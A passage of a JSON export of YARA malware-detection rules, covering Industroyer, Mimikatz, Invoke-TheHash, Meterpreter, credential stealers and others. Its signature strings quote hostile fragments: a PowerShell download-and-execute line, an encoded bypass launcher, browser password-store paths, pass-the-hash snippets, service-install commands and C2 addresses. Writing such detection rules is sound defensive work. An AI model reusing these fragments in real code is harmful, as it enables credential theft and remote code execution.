$s3 = \"ChangeServiceConfig failed (%d)\" fullword ascii\n      $s4 = \"Proxy %d:%s %d\" fullword ascii\n      $s5 = \"win9807.tmp\" fullword ascii\n      $s7 = \"Service stopped successfully\" fullword ascii\n      $s8 = \"current dns:%s\" fullword ascii\n      $s9 = \"%c%u|%u|%u|%u|%u|\" fullword ascii\n      $s10 = \"[-]send %d: \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them )\n}","date":"2017-06-23 10:30:01","description":"Detects malware from Operation Waterbear","minimum_yara":"1.7","name":"Waterbear_13_Jun17_RID2D65","reference":"https://goo.gl/L9g9eR","required_modules":[],"rule_hash":"a64ad8654c020362cf9b23e6708a2aae","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PowerShell_ISESteroids_Obfuscation_RID347F : DEMO OBFUS SCRIPT T1027 T1064 T1086 {\n   meta:\n      description = \"Detects PowerShell ISESteroids obfuscation\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/danielhbohannon/status/877953970437844993\"\n      date = \"2017-06-23 15:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, OBFUS, SCRIPT, T1027, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/\\\\/===\\\\__\" ascii\n      $x2 = \"${__/\\\\/==\" ascii\n      $x3 = \"Catch { }\" fullword ascii\n      $x4 = \"\\\\_/=} ${_\" ascii\n   condition: \n      2 of them\n}","date":"2017-06-23 15:33:01","description":"Detects PowerShell ISESteroids obfuscation","minimum_yara":"1.7","name":"PowerShell_ISESteroids_Obfuscation_RID347F","reference":"https://twitter.com/danielhbohannon/status/877953970437844993","required_modules":[],"rule_hash":"e40c9648874e86136bb44852d5e4d4ec","score":75,"tags":["OBFUS","T1064","SCRIPT","DEMO","T1027","T1086"]},{"author":"Florian Roth","content":"rule CN_Actor_AmmyyAdmin_RID2E4F : DEMO EXE FILE MAL T1072 T1219 {\n   meta:\n      description = \"Detects Ammyy Admin Downloader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - CN Actor\"\n      date = \"2017-06-22 11:09:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1072, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"\\\\Ammyy\\\\sources\\\\main\\\\Downloader.cpp\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-06-22 11:09:01","description":"Detects Ammyy Admin Downloader","minimum_yara":"1.7","name":"CN_Actor_AmmyyAdmin_RID2E4F","reference":"Internal Research - CN Actor","required_modules":[],"rule_hash":"796cf7ca3dc1476711f6d6354387e64a","score":60,"tags":["T1072","MAL","DEMO","FILE","T1219","EXE"]},{"author":"Florian Roth","content":"rule BTC_Miner_lsass1_chrome_2_RID3068 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a Bitcoin Miner\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - CN Actor\"\n      date = \"2017-06-22 12:38:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-t, --threads=N       number of miner threads (default: number of processors)\" fullword ascii\n      $x2 = \"-O, --userpass=U:P    username:password pair for mining server\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 1 of them )\n}","date":"2017-06-22 12:38:31","description":"Detects a Bitcoin Miner","minimum_yara":"1.7","name":"BTC_Miner_lsass1_chrome_2_RID3068","reference":"Internal Research - CN Actor","required_modules":[],"rule_hash":"f7838095e37a2ad5a410e418e87e214c","score":60,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CN_Actor_RA_Tool_Ammyy_mscorsvw_RID3338 : DEMO EXE FILE MAL T1072 T1219 {\n   meta:\n      description = \"Detects Ammyy remote access tool\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - CN Actor\"\n      date = \"2017-06-22 14:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1072, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Please enter password for accessing remote computer\" fullword ascii\n      $s2 = \"Die Zugriffsanforderung wurde vom Remotecomputer abgelehnt\" fullword ascii\n      $s3 = \"It will automatically be run the next time this computer is restart or you can start it manually\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )\n}","date":"2017-06-22 14:38:31","description":"Detects Ammyy remote access tool","minimum_yara":"1.7","name":"CN_Actor_RA_Tool_Ammyy_mscorsvw_RID3338","reference":"Internal Research - CN Actor","required_modules":[],"rule_hash":"e24a151b42a02c90d321abaae2d01a04","score":75,"tags":["T1072","MAL","DEMO","FILE","T1219","EXE"]},{"author":"Florian Roth","content":"rule HTA_with_WScript_Shell_RID2F8B : DEMO SUSP {\n   meta:\n      description = \"Detects WScript Shell in HTA\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/msftmmpc/status/877396932758560768\"\n      date = \"2017-06-21 12:01:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<hta:application windowstate=\\\"minimize\\\"/>\" \n      $s2 = \"<script>var b=new ActiveXObject(\\\"WScript.Shell\\\");\" ascii\n   condition: \n      all of them\n}","date":"2017-06-21 12:01:41","description":"Detects WScript Shell in HTA","minimum_yara":"1.7","name":"HTA_with_WScript_Shell_RID2F8B","reference":"https://twitter.com/msftmmpc/status/877396932758560768","required_modules":[],"rule_hash":"14bdadb231881f3fe7e0fdd15f1f3b9a","score":80,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule HTA_Embedded_RID2B57 : DEMO SUSP {\n   meta:\n      description = \"Detects an embedded HTA file\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/msftmmpc/status/877396932758560768\"\n      date = \"2017-06-21 09:02:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<hta:application windowstate=\\\"minimize\\\"/>\" \n   condition: \n      $s1 and not $s1 in ( 0 .. 50000 )\n}","date":"2017-06-21 09:02:21","description":"Detects an embedded HTA file","minimum_yara":"1.7","name":"HTA_Embedded_RID2B57","reference":"https://twitter.com/msftmmpc/status/877396932758560768","required_modules":[],"rule_hash":"f30542960e1d8208ff631623e25e0839","score":50,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Mimikatz_Gen_Strings_RID2F19 : DEMO EXE FILE GEN HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Detects Mimikatz by using some special strings\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-06-19 11:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] '%s' service already started\" fullword wide\n      $s2 = \"** Security Callback! **\" fullword wide\n      $s3 = \"Try to export a software CA to a crypto (virtual)hardware\" fullword wide\n      $s4 = \"enterpriseadmin\" fullword wide\n      $s5 = \"Ask debug privilege\" fullword wide\n      $s6 = \"Injected =)\" fullword wide\n      $s7 = \"** SAM ACCOUNT **\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )\n}","date":"2017-06-19 11:42:41","description":"Detects Mimikatz by using some special strings","minimum_yara":"1.7","name":"Mimikatz_Gen_Strings_RID2F19","reference":"Internal Research","required_modules":[],"rule_hash":"6d80063795e5abedb4128385bd79657b","score":75,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","GEN","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Invoke_SMBExec_RID2C43 : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Detects Invoke-WmiExec or Invoke-SmbExec\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 09:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-SMBExec -Target\" fullword ascii\n      $x2 = \"$packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID\" fullword ascii\n      $s1 = \"Write-Output \\\"Command executed with service $SMB_service on $Target\\\"\" fullword ascii\n      $s2 = \"$packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00\" fullword ascii\n      $s3 = \"$SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \\\\svcctl\" fullword ascii\n   condition: \n      ( filesize < 400KB and 1 of them )\n}","date":"2017-06-14 09:41:41","description":"Detects Invoke-WmiExec or Invoke-SmbExec","minimum_yara":"1.7","name":"Invoke_SMBExec_RID2C43","reference":"https://github.com/Kevin-Robertson/Invoke-TheHash","required_modules":[],"rule_hash":"a2e4a70fd04d68b87334e43737e46318","score":75,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Invoke_WMIExec_Gen_1_RID2E57 : DEMO GEN SCRIPT T1064 {\n   meta:\n      description = \"Detects Invoke-WmiExec or Invoke-SmbExec\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 11:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-WMIExec \" ascii\n      $x2 = \"$target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))\" fullword ascii\n      $s1 = \"Import-Module $PWD\\\\Invoke-TheHash.ps1\" fullword ascii\n      $s2 = \"Import-Module $PWD\\\\Invoke-SMBClient.ps1\" fullword ascii\n      $s3 = \"$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList\" fullword ascii\n      $x4 = \"Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0\" ascii\n   condition: \n      1 of them\n}","date":"2017-06-14 11:10:21","description":"Detects Invoke-WmiExec or Invoke-SmbExec","minimum_yara":"1.7","name":"Invoke_WMIExec_Gen_1_RID2E57","reference":"https://github.com/Kevin-Robertson/Invoke-TheHash","required_modules":[],"rule_hash":"976960adf81103acb127599a8a4a26f5","score":75,"tags":["GEN","DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Invoke_SMBExec_Invoke_WMIExec_1_RID326F : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Semiautomatic generated rule - from files Invoke-SMBExec.ps1, Invoke-WMIExec.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 14:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$process_ID = $process_ID -replace \\\"-00-00\\\",\\\"\\\"\" fullword ascii\n      $s2 = \"Write-Output \\\"$Target did not respond\\\"\" fullword ascii\n      $s3 = \"[Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-06-14 14:05:01","description":"Semiautomatic generated rule - from files Invoke-SMBExec.ps1, Invoke-WMIExec.ps1","minimum_yara":"1.7","name":"Invoke_SMBExec_Invoke_WMIExec_1_RID326F","reference":"https://github.com/Kevin-Robertson/Invoke-TheHash","required_modules":[],"rule_hash":"029645dc82fd3fae36789635e19def06","score":75,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Invoke_WMIExec_Gen_RID2DC7 : DEMO GEN SCRIPT T1064 {\n   meta:\n      description = \"Semiautomatic generated rule - from files Invoke-SMBClient.ps1, Invoke-SMBExec.ps1, Invoke-WMIExec.ps1, Invoke-WMIExec.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Kevin-Robertson/Invoke-TheHash\"\n      date = \"2017-06-14 10:46:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)\" fullword ascii\n      $s2 = \"$client_challenge = [String](1..8 | ForEach-Object {\\\"{0:X2}\\\" -f (Get-Random -Minimum 1 -Maximum 255)})\" fullword ascii\n      $s3 = \"$NTLM_hash_bytes = $NTLM_hash_bytes.Split(\\\"-\\\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-06-14 10:46:21","description":"Semiautomatic generated rule - from files Invoke-SMBClient.ps1, Invoke-SMBExec.ps1, Invoke-WMIExec.ps1, Invoke-WMIExec.ps1","minimum_yara":"1.7","name":"Invoke_WMIExec_Gen_RID2DC7","reference":"https://github.com/Kevin-Robertson/Invoke-TheHash","required_modules":[],"rule_hash":"001e9c94c3e51137b38e6211cf602a27","score":75,"tags":["GEN","DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Industroyer_Portscan_3_Output_RID32E4 : APT DEMO {\n   meta:\n      description = \"Detects Industroyer related custom port scaner output file\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13 14:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WSA library load complite.\" fullword ascii\n      $s2 = \"Connection refused\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-06-13 14:24:31","description":"Detects Industroyer related custom port scaner output file","minimum_yara":"1.7","name":"Industroyer_Portscan_3_Output_RID32E4","reference":"https://goo.gl/x81cSy","required_modules":[],"rule_hash":"71a54e0dd41891a6722de498635e35b2","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule Industroyer_Malware_1_RID2F71 : APT DEMO EXE FILE MAL T1050 {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13 11:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"haslo.exe\" fullword ascii\n      $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\%ls\" fullword wide\n      $s3 = \"SYS_BASCON.COM\" fullword wide\n      $s4 = \"*.pcmt\" fullword wide\n      $s5 = \"*.pcmi\" fullword wide\n      $x1 = { 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 73\n         00 5C 00 25 00 6C 00 73 00 00 00 49 00 6D 00 61\n         00 67 00 65 00 50 00 61 00 74 00 68 00 00 00 43\n         00 3A 00 5C 00 00 00 44 00 3A 00 5C 00 00 00 45\n         00 3A 00 5C 00 00 00 } \n      $x2 = \"haslo.dat\\x00Crash\" \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 2 of them )\n}","date":"2017-06-13 11:57:21","description":"Detects Industroyer related malware","minimum_yara":"1.7","name":"Industroyer_Malware_1_RID2F71","reference":"https://goo.gl/x81cSy","required_modules":[],"rule_hash":"3966d7bde9684b2e7f9545d6f419f55b","score":75,"tags":["T1050","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Industroyer_Malware_2_RID2F72 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13 11:57:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"sc create %ls type= own start= auto error= ignore binpath= \\\"%ls\\\" displayname= \\\"%ls\\\"\" fullword wide\n      $x2 = \"10.15.1.69:3128\" fullword wide\n      $s1 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)\" fullword wide\n      $s2 = \"/c sc stop %s\" fullword wide\n      $s3 = \"sc start %ls\" fullword wide\n      $s4 = \"93.115.27.57\" fullword wide\n      $s5 = \"5.39.218.152\" fullword wide\n      $s6 = \"tierexe\" fullword wide\n      $s7 = \"comsys\" fullword wide\n      $s8 = \"195.16.88.6\" fullword wide\n      $s9 = \"TieringService\" fullword wide\n      $a1 = \"TEMP\\x00\\x00DEF\" fullword wide\n      $a2 = \"TEMP\\x00\\x00DEF-C\" fullword wide\n      $a3 = \"TEMP\\x00\\x00DEF-WS\" fullword wide\n      $a4 = \"TEMP\\x00\\x00DEF-EP\" fullword wide\n      $a5 = \"TEMP\\x00\\x00DC-2-TEMP\" fullword wide\n      $a6 = \"TEMP\\x00\\x00DC-2\" fullword wide\n      $a7 = \"TEMP\\x00\\x00CES-McA-TEMP\" fullword wide\n      $a8 = \"TEMP\\x00\\x00SRV_WSUS\" fullword wide\n      $a9 = \"TEMP\\x00\\x00SRV_DC-2\" fullword wide\n      $a10 = \"TEMP\\x00\\x00SCE-WSUS01\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) or 3 of them or 1 of ( $a* ) ) or ( 5 of them )\n}","date":"2017-06-13 11:57:31","description":"Detects Industroyer related malware","minimum_yara":"1.7","name":"Industroyer_Malware_2_RID2F72","reference":"https://goo.gl/x81cSy","required_modules":[],"rule_hash":"6149b4f102b3e49c8c09b1548cbc97fd","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Industroyer_Portscan_3_RID2FF4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Industroyer related custom port scaner\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13 12:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"!ZBfamily\" fullword ascii\n      $s2 = \":g/outddomo;\" fullword ascii\n      $s3 = \"GHIJKLMNOTST\" fullword ascii\n      $d1 = \"Error params Arguments!!!\" fullword wide\n      $d2 = \"^(.+?.exe).*\\\\s+-ip\\\\s*=\\\\s*(.+)\\\\s+-ports\\\\s*=\\\\s*(.+)$\" fullword wide\n      $d3 = \"Exhample:App.exe -ip= 127.0.0.1-100,\" fullword wide\n      $d4 = \"Error IP Range %ls - %ls\" fullword wide\n      $d5 = \"Can't closesocket.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of ( $s* ) or 2 of ( $d* ) )\n}","date":"2017-06-13 12:19:11","description":"Detects Industroyer related custom port scaner","minimum_yara":"1.7","name":"Industroyer_Portscan_3_RID2FF4","reference":"https://goo.gl/x81cSy","required_modules":[],"rule_hash":"ce1b1e4b41117d92ba4e449478a45b82","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Industroyer_Malware_4_RID2F74 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13 11:57:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"haslo.dat\" fullword wide\n      $s2 = \"defragsvc\" fullword ascii\n      $a1 = { 00 2E 00 64 00 61 00 74 00 00 00 43 72 61 73 68 00 00 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or $a1 )\n}","date":"2017-06-13 11:57:51","description":"Detects Industroyer related malware","minimum_yara":"1.7","name":"Industroyer_Malware_4_RID2F74","reference":"https://goo.gl/x81cSy","required_modules":[],"rule_hash":"de708439171fb45cddb5e3eeef7d373a","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Industroyer_Malware_5_RID2F75 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Industroyer related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/x81cSy\"\n      date = \"2017-06-13 11:58:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"D2MultiCommService.exe\" fullword ascii\n      $x2 = \"Crash104.dll\" fullword ascii\n      $x3 = \"iec104.log\" fullword ascii\n      $x4 = \"IEC-104 client: ip=%s; port=%s; ASDU=%u \" fullword ascii\n      $s1 = \"Error while getaddrinfo executing: %d\" fullword ascii\n      $s2 = \"return info-Remote command\" fullword ascii\n      $s3 = \"Error killing process ...\" fullword ascii\n      $s4 = \"stop_comm_service_name\" fullword ascii\n      $s5 = \"*1* Data exchange: Send: %d (%s)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 4 of them ) ) or ( all of them )\n}","date":"2017-06-13 11:58:01","description":"Detects Industroyer related malware","minimum_yara":"1.7","name":"Industroyer_Malware_5_RID2F75","reference":"https://goo.gl/x81cSy","required_modules":[],"rule_hash":"29d80ef09b2ed59741953462e6f50a90","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CredentialStealer_Generic_Backdoor_RID347C : DEMO EXE FILE GEN MAL T1003 {\n   meta:\n      description = \"Detects credential stealer byed on many strings that indicate password store access\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-06-07 15:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetOperaLoginData\" fullword ascii\n      $s2 = \"GetInternetExplorerCredentialsPasswords\" fullword ascii\n      $s3 = \"%s\\\\Opera Software\\\\Opera Stable\\\\Login Data\" fullword ascii\n      $s4 = \"select *  from moz_logins\" fullword ascii\n      $s5 = \"%s\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n      $s6 = \"Host.dll.Windows\" fullword ascii\n      $s7 = \"GetInternetExplorerVaultPasswords\" fullword ascii\n      $s8 = \"GetWindowsLiveMessengerPasswords\" fullword ascii\n      $s9 = \"%s\\\\Chromium\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n      $s10 = \"%s\\\\Opera\\\\Opera\\\\profile\\\\wand.dat\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 4 of them )\n}","date":"2017-06-07 15:32:31","description":"Detects credential stealer byed on many strings that indicate password store access","minimum_yara":"1.7","name":"CredentialStealer_Generic_Backdoor_RID347C","reference":"Internal Research","required_modules":[],"rule_hash":"8783d298ba001abc08aa5dc32383f3ee","score":75,"tags":["MAL","DEMO","T1003","FILE","GEN","EXE"]},{"author":"Florian Roth","content":"rule Beacon_K5om_RID2B14 : APT DEMO EXE FILE HKTL METASPLOIT T1105 {\n   meta:\n      description = \"Detects Meterpreter Beacon - file K5om.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html\"\n      date = \"2017-06-07 08:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL, METASPLOIT, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n      $x2 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n      $x3 = \"%d is an x86 process (can't inject x64 content)\" fullword ascii\n      $s1 = \"Could not open process token: %d (%u)\" fullword ascii\n      $s2 = \"0fd00b.dll\" fullword ascii\n      $s3 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n      $s4 = \"Could not connect to pipe (%s): %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 3 of them ) )\n}","date":"2017-06-07 08:51:11","description":"Detects Meterpreter Beacon - file K5om.dll","minimum_yara":"1.7","name":"Beacon_K5om_RID2B14","reference":"https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html","required_modules":[],"rule_hash":"362807b09d5d4d1589b723f1d0279264","score":75,"tags":["HKTL","METASPLOIT","DEMO","FILE","APT","EXE","T1105"]},{"author":"Florian Roth","content":"rule Backdoor_Redosdru_Jun17_RID2FD1 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware Redosdru - file systemHome.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/OOB3mH\"\n      date = \"2017-06-04 12:13:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\%d.gho\" fullword ascii\n      $x2 = \"%s\\\\nt%s.dll\" fullword ascii\n      $x3 = \"baijinUPdate\" fullword ascii\n      $s1 = \"RegQueryValueEx(Svchost\\\\netsvcs)\" fullword ascii\n      $s2 = \"serviceone\" fullword ascii\n      $s3 = \"\u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#p \u001f#f \u001f#\" fullword ascii\n      $s4 = \"servicetwo\" fullword ascii\n      $s5 = \"UpdateCrc\" fullword ascii\n      $s6 = \"\u001f#[ \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#x \u001f#\" fullword ascii\n      $s7 = \"nwsaPAgEnT\" fullword ascii\n      $s8 = \"%-24s %-15s 0x%x(%d) \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) or 4 of them )\n}","date":"2017-06-04 12:13:21","description":"Detects malware Redosdru - file systemHome.exe","minimum_yara":"1.7","name":"Backdoor_Redosdru_Jun17_RID2FD1","reference":"https://goo.gl/OOB3mH","required_modules":[],"rule_hash":"4acdec50c06c0e961b3f1b76531dbd7b","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Backdoor_Nitol_Jun17_RID2E8F : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware backdoor Nitol - file wyawou.exe - Attention: this rule also matches on Upatre Downloader\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/OOB3mH\"\n      date = \"2017-06-04 11:19:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   